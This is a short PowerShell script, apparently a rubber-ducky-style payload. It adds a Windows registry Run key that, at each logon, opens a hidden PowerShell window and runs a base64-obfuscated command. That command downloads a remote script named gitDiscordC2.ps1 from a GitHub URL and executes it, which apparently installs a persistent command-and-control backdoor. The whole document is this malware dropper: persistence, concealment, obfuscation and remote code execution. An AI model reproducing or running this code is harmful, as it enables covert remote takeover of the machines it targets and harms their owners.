$taskName = "duckduckduckduck"
$script = 'powershell -WindowStyle Hidden -NoProfile -Command "Invoke-Expression ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("cG93ZXJzaGVsbCAtV2luZG93U3R5bGUgSGlkZGVuIC1Ob1Byb2ZpbGUgLUNvbW1hbmQgIkludm9rZS1SZXN0TWV0aG9kIC1VcmkgJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9KSDUxNy9EdWNreVBpY28vcmVmcy9oZWFkcy9tYWluL2dpdERpc2NvcmRDMi5wczEnIC1IZWFkZXJzIEB7J0NhY2hlLUNvbnRyb2wnPSduby1jYWNoZSd9IHwgSW52b2tlLUV4cHJlc3Npb24i")))"'
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $taskName -Value $script
